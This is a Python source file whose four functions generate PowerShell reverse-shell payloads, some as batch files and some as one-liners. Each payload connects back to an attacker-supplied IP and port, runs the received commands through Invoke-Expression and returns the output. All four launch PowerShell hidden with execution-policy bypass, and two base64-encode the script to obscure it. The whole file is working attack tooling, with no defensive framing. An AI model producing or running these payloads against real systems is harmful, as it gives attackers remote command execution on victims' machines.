import base64

def generate_payload_ps(ip, port, output_file):
    batch_script_ps = f"""@echo off
powershell -NoP -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TcpClient('{ip}',{port}); $s=$c.GetStream(); $w=New-Object System.IO.StreamWriter($s); $w.AutoFlush=$true; $r=New-Object System.IO.StreamReader($s); while($true){{ $cmd=$r.ReadLine(); if($cmd -eq $null){{break}}; $out=try{{ Invoke-Expression $cmd 2>&1 | Out-String }}catch{{ $_ }}; $w.WriteLine($out) }}; $c.Close()"
"""
    return batch_script_ps

def generate_payload_ps_encoded(ip, port, output_file):
    batch_script_ps = f"""
"$c=New-Object System.Net.Sockets.TcpClient('{ip}',{port}); $s=$c.GetStream(); $w=New-Object System.IO.StreamWriter($s); $w.AutoFlush=$true; $r=New-Object System.IO.StreamReader($s); while($true){{ $cmd=$r.ReadLine(); if($cmd -eq $null){{break}}; $out=try{{ Invoke-Expression $cmd 2>&1 | Out-String }}catch{{ $_ }}; $w.WriteLine($out) }}; $c.Close()"
"""
    script_bytes = batch_script_ps.encode('utf-16le') 
    script_base64 = base64.b64encode(script_bytes).decode('utf-8')
    
    encoded_script_batch = f"""@echo off    
powershell -NoP -W Hidden -Exec Bypass -EncodedCommand {script_base64}"""
    return encoded_script_batch

def generate_payload_ps_text(ip, port):
    script_ps = f"""
powershell -NoP -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TcpClient('{ip}',{port}); $s=$c.GetStream(); $w=New-Object System.IO.StreamWriter($s); $w.AutoFlush=$true; $r=New-Object System.IO.StreamReader($s); while($true){{ $cmd=$r.ReadLine(); if($cmd -eq $null){{break}}; $out=try{{ Invoke-Expression $cmd 2>&1 | Out-String }}catch{{ $_ }}; $w.WriteLine($out) }}; $c.Close()"
"""
    return script_ps

def generate_payload_ps_text_encoded(ip, port):
    script_ps = f"""
$c=New-Object System.Net.Sockets.TcpClient('{ip}',{port}); $s=$c.GetStream(); $w=New-Object System.IO.StreamWriter($s); $w.AutoFlush=$true; $r=New-Object System.IO.StreamReader($s); while($true){{ $cmd=$r.ReadLine(); if($cmd -eq $null){{break}}; $out=try{{ Invoke-Expression $cmd 2>&1 | Out-String }}catch{{ $_ }}; $w.WriteLine($out) }}; $c.Close()
"""
    
    script_bytes = script_ps.encode('utf-16le')  # PowerShell expects UTF-16LE for Base64 encoding
    script_base64 = base64.b64encode(script_bytes).decode('utf-8')
    
    encoded_script = f"powershell -NoP -W Hidden -Exec Bypass -EncodedCommand {script_base64}"
    return encoded_script


